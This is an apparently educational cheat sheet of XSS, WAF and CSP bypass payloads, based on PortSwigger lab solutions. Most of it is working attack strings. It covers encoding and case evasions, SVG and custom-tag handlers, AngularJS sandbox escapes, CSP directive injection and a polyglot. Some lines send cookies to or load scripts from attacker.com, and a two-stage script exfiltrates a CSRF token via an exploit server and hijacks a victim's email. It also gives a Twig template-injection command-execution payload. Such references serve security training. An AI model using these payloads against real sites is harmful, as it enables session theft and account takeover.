# XSS Bypass Techniques - Complete Reference

## Overview

This comprehensive guide covers Web Application Firewall (WAF) bypass techniques, filter evasion methods, and advanced XSS exploitation strategies derived from PortSwigger Web Security Academy labs and real-world scenarios.

---

## Table of Contents

1. [HTML Encoding Bypass](#html-encoding-bypass)
2. [Character Set Manipulation](#character-set-manipulation)
3. [WAF Bypass Strategies](#waf-bypass-strategies)
4. [SVG-Based Bypasses](#svg-based-bypasses)
5. [AngularJS Sandbox Escapes](#angularjs-sandbox-escapes)
6. [CSP Bypass Techniques](#csp-bypass-techniques)
7. [Template Injection](#template-injection)
8. [Alternative Event Handlers](#alternative-event-handlers)
9. [Custom Tags Exploitation](#custom-tags-exploitation)
10. [Advanced Encoding Techniques](#advanced-encoding-techniques)

---

## HTML Encoding Bypass

### Context: HTML Attributes with Decoders

**Vulnerability**: When input is reflected in an HTML attribute that's decoded before JavaScript execution.

**Technique**: Use HTML entities that browsers decode before JavaScript parsing.

### Example from PortSwigger Labs

**Vulnerable Pattern**:
```html
<a onclick="var x='USER_INPUT'">Click</a>
```

**Attack**:
```
Input: &apos;-alert(1)-&apos;
Reflected: <a onclick="var x='&apos;-alert(1)-&apos;'">
Decoded by browser: <a onclick="var x=''-alert(1)-''">
```

**Why It Works**:
1. HTML entity decoding happens BEFORE JavaScript parsing
2. `&apos;` becomes `'` at HTML level
3. JavaScript parser sees closed string
4. alert(1) executes as code

### Common HTML Entities for Bypass

```
&apos;  → '  (single quote)
&quot;  → "  (double quote)
&lt;    → <  (less than)
&gt;    → >  (greater than)
&#x27;  → '  (single quote hex)
&#x22;  → "  (double quote hex)
&#39;   → '  (single quote decimal)
&#34;   → "  (double quote decimal)
```

### Payload Examples

**Breaking out of single-quoted attribute**:
```javascript
&apos;-alert(1)-&apos;
&#x27;-alert(1)-&#x27;
&#39;-alert(1)-&#39;
```

**Breaking out of double-quoted attribute**:
```javascript
&quot;-alert(1)-&quot;
&#x22;-alert(1)-&#x22;
&#34;-alert(1)-&#34;
```

### Full Context Example

**PortSwigger Lab**: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded

**Vulnerable Code**:
```html
<a onclick="this.setAttribute('href','http://USER_INPUT')">
```

**Working Payload**:
```
http://attacker.com&apos;);alert(1);//
```

**Rendered HTML**:
```html
<a onclick="this.setAttribute('href','http://attacker.com&apos;);alert(1);//')">
```

**After HTML Entity Decoding**:
```html
<a onclick="this.setAttribute('href','http://attacker.com');alert(1);//')">
```

---

## Character Set Manipulation

### Case Variation

**Context**: Case-sensitive filters

**Technique**: Mix uppercase and lowercase to bypass string matching

**Examples**:
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
<SvG OnLoAd=alert(1)>
<BoDy OnLoAd=alert(1)>
<IFrAmE src="javascript:alert(1)">
```

**Why It Works**:
- HTML tags and attributes are case-insensitive
- Simple blacklist filters often match specific case
- Browser normalizes tag names before processing

### Space Bypass

**Context**: Filters that block space characters

**Techniques**:

**1. Forward Slash**:
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

**2. Tab Character** (URL-encoded: %09):
```html
<img%09src=x%09onerror=alert(1)>
<img    src=x   onerror=alert(1)>  <!-- literal tabs -->
```

**3. Newline** (URL-encoded: %0A or %0D):
```html
<img%0Asrc=x%0Aonerror=alert(1)>
<img%0Dsrc=x%0Donerror=alert(1)>
```

**4. Comment (in JavaScript)**:
```html
<img/**/src=x/**/onerror=alert(1)>
```

**5. NULL byte** (works in some contexts):
```html
<img%00src=x%00onerror=alert(1)>
```

### Quote Bypass

**Context**: Filters blocking quote characters

**Techniques**:

**1. No Quotes Needed**:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**2. Backticks (template literals)**:
```html
<img src=`x` onerror=`alert(1)`>
```

**3. Mix Quote Types**:
```html
<img src='x' onerror="alert(1)">
<img src="x" onerror='alert(1)'>
```

### Parentheses Bypass

**Context**: Filters blocking parentheses

**Techniques**:

**1. onerror with throw**:
```javascript
onerror=alert;throw 1
```

**2. Template literal tag function**:
```html
<svg onload=alert`1`>
```

**3. Exception-based execution**:
```javascript
onerror=alert;throw 1337
```

### Semicolon Bypass

**Context**: Filters blocking semicolons

**Techniques**:

**1. Arithmetic operators**:
```javascript
'-alert(1)-'
'+alert(1)+'
'*alert(1)*'
```

**2. Comma operator**:
```javascript
',alert(1)//'
```

**3. Newline**:
```javascript
'
alert(1)//
```

---

## WAF Bypass Strategies

### Systematic Enumeration with Burp Intruder

**PortSwigger Lab**: Reflected XSS with some SVG markup allowed

**Methodology**:

**Phase 1: Enumerate Allowed Tags**

1. **Setup Intruder**:
   - Position: `/?search=<§§>`
   - Attack type: Sniper
   - Payload type: Simple list

2. **Load Tag Payloads**:
   ```
   script
   img
   svg
   body
   iframe
   object
   embed
   animate
   animatetransform
   video
   audio
   [... full list from XSS cheat sheet]
   ```

3. **Run Attack and Filter**:
   - Sort by Status Code
   - Status 200 = Allowed
   - Status 400/403 = Blocked

4. **Identify Allowed Tags**:
   ```
   ✓ svg
   ✓ animatetransform
   ✓ title
   ✓ image
   ```

**Phase 2: Enumerate Allowed Attributes**

1. **Setup for Attributes**:
   - Position: `/?search=<svg><animatetransform §§=1>`
   - Load event handler payloads

2. **Event Handler Payloads**:
   ```
   onload
   onerror
   onclick
   onmouseover
   onbegin
   onend
   onrepeat
   [... full event handler list]
   ```

3. **Identify Allowed Events**:
   ```
   ✓ onbegin
   ```

**Phase 3: Construct Exploit**:
```html
<svg><animatetransform onbegin=alert(1)>
```

### WAF Evasion Techniques

**1. Tag Fragmentation**:
```html
<!-- HTML comments -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>

<!-- Newlines -->
<scri
pt>alert(1)</script>
```

**2. Character Insertion**:
```html
<!-- NULL byte (limited browser support) -->
<scri\x00pt>alert(1)</script>
```

**3. Alternate Syntax**:
```html
<!-- Self-closing tags -->
<script src=//attacker.com/x.js />

<!-- No closing tag -->
<img src=x onerror=alert(1)>
```

**4. Polyglot Payloads** (work in multiple contexts):
```javascript
javascript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

---

## SVG-Based Bypasses

### SVG Tags and Events

SVG elements provide numerous bypass opportunities when standard HTML tags are blocked.

### Allowed SVG Tags

```html
<svg>
<animate>
<animatetransform>
<animatemotion>
<set>
<image>
<foreignobject>
<title>
<desc>
<use>
```

### SVG Event Handlers

```html
onbegin
onend
onrepeat
onload (on svg root)
```

### SVG Exploitation Techniques

**1. Basic SVG XSS**:
```html
<svg onload=alert(1)>
```

**2. Nested SVG Elements**:
```html
<svg><animate onbegin=alert(1)>
<svg><animatetransform onbegin=alert(1)>
```

**3. SVG with Anchor**:
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
```

**4. SVG foreignObject**:
```html
<svg><foreignobject><body onload=alert(1)></foreignobject></svg>
```

### PortSwigger Lab Example

**Lab**: Reflected XSS with event handlers and href attributes blocked

**Challenge**: Standard event handlers and href blocked

**Solution**: Use SVG animate to dynamically set href
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
```

**Why It Works**:
- `animate` element modifies attributes dynamically
- Filter checks static `href=` patterns
- Dynamic attribute setting bypasses filter
- Requires click on text to trigger

---

## AngularJS Sandbox Escapes

### Understanding AngularJS Sandbox

**Context**: AngularJS versions < 1.6 had sandboxing to restrict expression capabilities

**Purpose**: Prevent malicious code execution in templates

**Limitation**: Sandbox can be bypassed

### Basic AngularJS Expression

**Vulnerable Pattern**:
```html
<body ng-app>
<div>{{USER_INPUT}}</div>
</body>
```

**Basic Payloads**:
```javascript
{{1+1}}  // Test if AngularJS active (displays 2)
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

### Sandbox Escape Techniques

**1. Constructor Chain**:
```javascript
{{constructor.constructor('alert(1)')()}}
```

**Breakdown**:
- `constructor` → Object's constructor function
- `.constructor` → Function constructor
- `('alert(1)')` → Code as string
- `()` → Execute

**2. Using $on**:
```javascript
{{$on.constructor('alert(1)')()}}
```

**3. Using toString**:
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

### Advanced: Sandbox Escape Without Strings

**PortSwigger Lab**: Reflected XSS with AngularJS sandbox escape without strings

**Challenge**: Cannot use string literals (quotes blocked)

**Solution**:
```javascript
1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

**Breakdown**:

1. **Corrupt charAt**:
   ```javascript
   toString().constructor.prototype.charAt=[].join
   ```
   - Overwrites charAt on String prototype
   - Breaks sandbox's string validation

2. **Build string from character codes**:
   ```javascript
   toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
   ```
   - Character codes: `120=x, 61==, 97=a, 108=l, 101=e, 114=r, 116=t, 40=(, 49=1, 41=)`
   - Result: `x=alert(1)`

3. **Execute via orderBy**:
   ```javascript
   [1]|orderBy:[constructed_string]
   ```
   - orderBy filter processes expression
   - Evaluates constructed string
   - Executes `alert(1)`

### AngularJS CSP Bypass

**PortSwigger Lab**: Reflected XSS with AngularJS sandbox escape and CSP

**Challenge**: CSP blocks inline scripts, AngularJS sandbox active

**Solution**:
```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)' autofocus>#x
```

**Breakdown**:

1. **ng-focus directive**: Triggers on focus
2. **$event.composedPath()**: Returns event path array (includes window)
3. **orderBy filter**: Processes the array
4. **(z=alert)(document.cookie)**: Assigns alert to z, then calls it
5. **autofocus**: Auto-focuses element
6. **#x**: URL hash focuses element with id=x

**Why It Works**:
- CSP allows event handlers (not inline `<script>`)
- ng-focus is an AngularJS directive, not blocked by CSP
- Expression evaluation within directive bypasses sandbox
- Variable assignment `(z=alert)` bypasses filter

---

## CSP Bypass Techniques

### CSP Policy Injection

**PortSwigger Lab**: Reflected XSS protected by CSP, with CSP bypass

**Vulnerable CSP**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=USER_CONTROLLED
```

**Exploit**: Inject additional directive via token parameter
```
token=;script-src-elem 'unsafe-inline'
```

**Result**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
```

**Why It Works**:
- Semicolon terminates report-uri directive
- `script-src-elem` is more specific than `script-src`
- More specific directives take precedence
- `'unsafe-inline'` allows inline scripts

**Full Exploit URL**:
```
https://LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem%20'unsafe-inline'
```

### Dangling Markup for CSP Bypass

**PortSwigger Lab**: Reflected XSS protected by very strict CSP, with dangling markup attack

**Strict CSP**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

**Problem**: CSP blocks all inline scripts

**Missing Directive**: No `form-action` directive

**Exploit**: Form hijacking to exfiltrate CSRF token

**Phase 1: Button Injection**
```html
<button formaction="https://exploit-server.com" formmethod="get">Click me</button>
```

**Phase 2: Extract CSRF Token**
```html
email=foo"><button formaction="https://exploit-server.com/exploit" formmethod="get">Click me</button>
```

**Phase 3: Two-Stage Exploit**

```javascript
const academyFrontend = "https://LAB-ID.web-security-academy.net/";
const exploitServer = "https://exploit-server.com/exploit";
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    // Stage 2: Have token, change email
    const form = document.createElement('form');
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;

    const emailInput = document.createElement('input');
    emailInput.name = 'email';
    emailInput.value = 'hacker@evil.com';

    const tokenInput = document.createElement('input');
    tokenInput.name = 'csrf';
    tokenInput.value = csrf;

    form.append(emailInput, tokenInput);
    document.documentElement.append(form);
    form.submit();
} else {
    // Stage 1: No token yet, inject button to steal it
    location = `${academyFrontend}my-account?email=foo"><button formaction="${exploitServer}" formmethod="get">Click me</button>`;
}
```

**Why It Works**:
- CSP blocks JavaScript
- But doesn't restrict form submissions (no `form-action`)
- Form GET request exposes CSRF token in URL
- Exploit server receives token via query parameter
- Second stage uses token to change email

### JSONP Endpoints for CSP Bypass

**Concept**: If CSP whitelists certain domains, find JSONP endpoints on those domains

**Example CSP**:
```http
Content-Security-Policy: script-src 'self' https://trusted-site.com
```

**If trusted-site.com has JSONP**:
```html
<script src="https://trusted-site.com/jsonp?callback=alert"></script>
```

### Base Tag Hijacking

**Concept**: If CSP doesn't restrict `base-uri`, inject base tag

**Payload**:
```html
<base href="https://attacker.com/">
```

**Result**: All relative script/style URLs load from attacker's domain

---

## Template Injection

### JavaScript Template Literals

**Context**: Input reflected in ES6 template literal

**Vulnerable Pattern**:
```javascript
var msg = `Hello ${USER_INPUT}`;
```

**Exploitation**:
```javascript
${alert(1)}
${alert(document.domain)}
${fetch('//attacker.com?c='+document.cookie)}
```

**PortSwigger Lab**: Reflected XSS into a template literal

**Solution**:
```
/?search=${alert(1)}
```

**Why It Works**:
- Template literals evaluate `${}` as JavaScript expressions
- No escaping applied to expression syntax
- Runs in same scope as template literal

### Server-Side Template Injection

**Different from XSS**, but related:

**Jinja2 (Python)**:
```python
{{7*7}}  # Test injection
{{config.items()}}  # Expose config
```

**Twig (PHP)**:
```php
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## Alternative Event Handlers

### Common Event Handlers
```html
onclick, ondblclick, onmousedown, onmouseup, onmouseover,
onmousemove, onmouseout, onmouseenter, onmouseleave
```

### Less Common (Often Bypass Filters)
```html
<!-- Focus events -->
onfocus, onblur, onfocusin, onfocusout

<!-- Form events -->
onsubmit, onreset, oninput, onchange, oninvalid, onsearch

<!-- Keyboard events -->
onkeypress, onkeydown, onkeyup

<!-- Media events -->
onloadstart, onprogress, oncanplay, onplay, onpause

<!-- Animation events -->
onanimationstart, onanimationend, onanimationiteration

<!-- Transition events -->
ontransitionend, ontransitionrun, ontransitionstart

<!-- Wheel/Scroll -->
onwheel, onscroll

<!-- Touch (mobile) -->
ontouchstart, ontouchend, ontouchmove

<!-- SVG-specific -->
onbegin, onend, onrepeat

<!-- Other -->
onresize, onhashchange, onpageshow, onpagehide
```

### Automatic Trigger Events

**No user interaction needed**:
```html
<body onload=alert(1)>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<iframe onload=alert(1)>
```

---

## Custom Tags Exploitation

**PortSwigger Lab**: Reflected XSS with all standard tags blocked except custom ones

**Concept**: Application blocks standard HTML tags but allows custom tags

**Exploit**:
```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

**Breakdown**:
- `<xss>` → Custom tag (not in blacklist)
- `id=x` → Element identifier
- `onfocus=alert(document.cookie)` → Event handler
- `tabindex=1` → Makes element focusable
- `#x` → URL hash auto-focuses element

**Delivery via Exploit Server**:
```html
<script>
location = 'https://LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

**Why It Works**:
- Blacklist only contains standard HTML tags
- Custom tags are valid HTML5 elements
- Can have event handlers
- `tabindex` makes any element focusable
- Hash-based auto-focus triggers event

---

## Advanced Encoding Techniques

### Double Encoding

**Concept**: Application decodes input twice

**Example**:
```
Original:  <script>
URL:       %3Cscript%3E
Double:    %253Cscript%253E

After first decode: %3Cscript%3E
After second decode: <script>
```

### Unicode Encoding

```html
<!-- Unicode escape -->
<script\u003Ealert(1)</script>

<!-- HTML entity -->
<script&#x3E;alert(1)</script>

<!-- Overlong UTF-8 (usually blocked) -->
%C0%BC  → < (overlong encoding)
```

### Mutation XSS (mXSS)

**Concept**: Browser mutates sanitized HTML

**Example**:
```html
<!-- Input -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- After sanitizer -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- After browser mutation -->
<p title="</noscript><img src=x onerror=alert(1)>">
```

---

## References

1. **PortSwigger XSS Labs**: https://portswigger.net/web-security/all-labs#cross-site-scripting
2. **XSS Cheat Sheet**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
3. **OWASP XSS Filter Evasion**: https://owasp.org/www-community/xss-filter-evasion-cheatsheet
4. **HTML5 Security Cheatsheet**: https://html5sec.org/
5. **AngularJS Sandbox Escapes**: https://portswigger.net/research/dom-based-angularjs-sandbox-escapes

---

**Document Version**: 1.0
**Last Updated**: January 9, 2026
**Source**: PortSwigger Web Security Academy Labs & Research
